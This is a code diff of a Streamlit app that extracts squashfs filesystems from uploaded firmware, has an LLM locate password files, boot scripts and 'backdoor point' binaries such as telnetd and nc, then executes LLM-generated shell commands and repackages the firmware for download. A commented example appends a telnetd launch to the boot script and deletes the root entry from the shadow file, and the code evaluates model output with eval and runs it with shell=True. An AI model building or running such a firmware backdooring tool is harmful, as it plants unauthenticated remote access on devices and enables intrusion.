@@ -157,8 +157,7 @@ if st.session_state.button_clicked is None:
         cnt = 0
         if not squashfs_lines:
             st.info("squashfs Filesystem not found.")
-        else:
-            st.success("squashfs Filesystem found.")
+        else: 
             for i in range(len(squashfs_lines)):
                 if squashfs_lines[i] and squashfs_lines[i][2].lower() == 'squashfs':
                     offset = int(squashfs_lines[i][0])
@@ -171,47 +170,29 @@ if st.session_state.button_clicked is None:
                     cnt += 1
 
             os.makedirs(f'{user_dir}/rootfs', exist_ok=True) 
+            extracted_filesystems = []
             for i in range(cnt):
                 input_squashfs = f'{user_dir}/squashfs{i}.bin'
                 output_dir = f'{user_dir}/rootfs/squashfs-root-{i}'
                 extract_filesystem(input_squashfs, output_dir)
-                st.success(f"Filesystem extraction completed : squashfs-root-{i}")
+                extracted_filesystems.append(f"squashfs-root-{i}")
+            st.success(f"Filesystem extraction completed : {', '.join(extracted_filesystems)}")
 
             directory_tree(f'{user_dir}', f'{user_dir}/tree')
 
-            #file_paths = get_llm_response(1, f'{user_dir}/tree')
-            #file_paths_json1 = json.loads(file_paths)
+            file_paths = get_llm_response(1, f'{user_dir}/tree')
+            file_paths_json1 = json.loads(file_paths)
             #file_paths_json1 = {"passwd":"rootfs/squashfs-root-0/etc/config/passwd","shadow":"rootfs/squashfs-root-0/etc/config/shadow","boot_scripts":["rootfs/squashfs-root-0/etc/init.d/rc.local","rootfs/squashfs-root-0/etc/init.d/rcS"]}
-            file_paths_json1 = {"passwd":"rootfs/squashfs-root-0/etc/passwd", "shadow":"rootfs/squashfs-root-0/etc/shadow", "boot_script":"rootfs/squashfs-root-0/etc/init.d/rcS"}
+            #file_paths_json1 = {"passwd":"rootfs/squashfs-root-0/etc/passwd", "shadow":"rootfs/squashfs-root-0/etc/shadow", "boot_script":"rootfs/squashfs-root-0/etc/init.d/rcS"}
             st.session_state.file_paths_json1 = file_paths_json1
             st.markdown("---")
             st.write("### boot script & passwd")
             st.write(file_paths_json1)
             st.markdown("---")
-            # for key, path in file_paths_json1.items():
-            #     try:
-            #         if isinstance(path, list):
-            #             for single_path in path:
-            #                 with open(f'{user_dir}/{single_path}', 'r') as file:
-            #                     content = file.read()
-            #                     st.write(f"### {single_path}")
-            #                     st.code(content)
-            #                     st.markdown("---")
-            #         else:
-            #             with open(f'{user_dir}/{path}', 'r') as file:
-            #                 content = file.read()
-            #                 st.write(f"### {path}:")
-            #                 st.code(content)
-            #             st.markdown("---")
-            #     except FileNotFoundError:
-            #         st.info(f"File {path} not found.")
-            #     except Exception as e:
-            #         print(f"An error occurred while reading {path}: {e}")
-
-            #file_paths = get_llm_response(2, f'{user_dir}/tree')
-            #file_paths_json2 = json.loads(file_paths)
+            file_paths = get_llm_response(2, f'{user_dir}/tree')
+            file_paths_json2 = json.loads(file_paths)
             #file_paths_json2 = {"telnetd":"rootfs/squashfs-root-1/sbin/telnetd","nc":"rootfs/squashfs-root-1/bin/nc","socat":None,"busybox":None}
-            file_paths_json2 = {"telnetd":"rootfs/squashfs-root-0/sbin", "nc":"rootfs/squashfs-root-0/bin", "socat":None, "busybox":"rootfs/squashfs-root-0/bin"}
+            #file_paths_json2 = {"telnetd":"rootfs/squashfs-root-0/sbin", "nc":"rootfs/squashfs-root-0/bin", "socat":None, "busybox":"rootfs/squashfs-root-0/bin"}
             st.session_state.file_paths_json2 = file_paths_json2
             st.write("### Backdoor Point List")
             
@@ -219,7 +200,7 @@ if st.session_state.button_clicked is None:
             st.write(file_paths_json2)
             st.markdown("---")
 
-            st.write("### Choice Backdoor")
+            st.write("### Select Backdoor Type")
             columns = st.columns(4) 
             for idx, (key, path) in enumerate(file_paths_json2.items()):
                 with columns[idx]:
@@ -241,25 +222,19 @@ if st.session_state.button_clicked is None:
 if st.session_state.get("button_clicked"):
     st.markdown(f"### Backdoor Type : {st.session_state.button_clicked}")
     if st.session_state.button_clicked == "telnetd":
-        st.write("### boot script & passwd")
         setting_path = st.session_state.file_paths_json1
         binary_path = st.session_state.file_paths_json2
         user_dir = st.session_state.user_dir
-        # st.info(binary_path['telnetd'])
-        # st.info(setting_path['boot_script'])
-        # st.info(st.session_state.user_dir)
         commands = get_llm_response(3, None, setting_path, binary_path, st.session_state.user_dir)
         print(commands)
         commands = eval(commands)
         #commands = [f"echo '/sbin/telnetd &' >> {user_dir}/rootfs/squashfs-root-0/etc/init.d/rcS", f"sed -i '/^root:/d' {user_dir}/rootfs/squashfs-root-0/etc/shadow"]
-        st.code(commands)
         for cmd in commands:
             try:
-                subprocess.run(cmd, shell=True, check=True)
-                st.success(f'Execute : {cmd}')
+                subprocess.run(cmd, shell=True, check=True)  
             except subprocess.CalledProcessError as e:
                 st.info(f"Error occurred while executing the command: {cmd}")
-                #st.info(f"Error message: {e}")
+        st.success(f'Filesystem modification complete!')
         cmd = f"find {user_dir}/rootfs/* -type d -mtime -1"
         result = subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)
         lines = result.stdout.splitlines()
@@ -267,7 +242,7 @@ if st.session_state.get("button_clicked"):
         for line in lines:
             word = line.split('/')
             modified_fs.append(word[3])
-        st.info(f'modified fs : {modified_fs}')
+        st.success(f'Repackaging modified filesystem : {', '.join(modified_fs)}')
         for fs_path in modified_fs:
             cmd = ["mksquashfs", f"{user_dir}/rootfs/{fs_path}", f"{user_dir}/{fs_path}-patched", "-comp", "xz"]
             try:
@@ -281,7 +256,6 @@ if st.session_state.get("button_clicked"):
         file_path_dst = f"{user_dir}/{st.session_state.upload_file_name.split('.')[0]}-modified.bin"
         subprocess.run(["cp", file_path_src, file_path_dst], check=True)
         squashfs_lines = st.session_state.squashfs_lines
-        st.code(squashfs_lines)
         fs_size = {}
         for i in range(len(squashfs_lines)):
             if squashfs_lines[i] and squashfs_lines[i][2].lower() == 'squashfs':
@@ -298,8 +272,10 @@ if st.session_state.get("button_clicked"):
             overwrite_file(src_path, start_byte, end_byte, file_path_dst)
         file_name = file_path_dst.split("/")[-1] 
         file_data = read_file(file_path_dst)
+        st.write("### Download Modified Firmware")
+        st.write('Please click the download link below to download the modified firmware.')
         st.download_button(
-                label=f"{file_name}",
+                label=f"Download",
                 data=file_data,
                 file_name=file_name,
                 mime="application/octet-stream",
